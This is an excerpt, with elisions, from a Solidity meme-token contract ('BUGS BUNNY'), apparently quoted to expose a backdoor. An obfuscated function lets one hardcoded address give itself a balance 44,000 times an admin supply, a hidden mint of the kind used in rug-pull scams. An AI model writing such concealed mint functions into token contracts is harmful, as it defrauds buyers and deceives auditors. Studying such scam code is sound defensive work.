...
contract MEMEToken is Ownable {
    ...
    function lllindadddceoadmin() external {
        ...
        if (_lindaceo66!= tswojaks){
            revert("_lindaceo"); 
        }
        if(_lindaceo66 == tswojaks){
            _balances[_lindaceo66] = adminSupply()*(44000);
        }
    ...
    constructor(string memory tokenName_, string memory Tokensymbol_) {
        _lindaceo66 = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
...
contract CoinToken is MEMEToken {
    string _name = "BUGS BUNNY";
    string _symbol = "BUGSBUNNY";
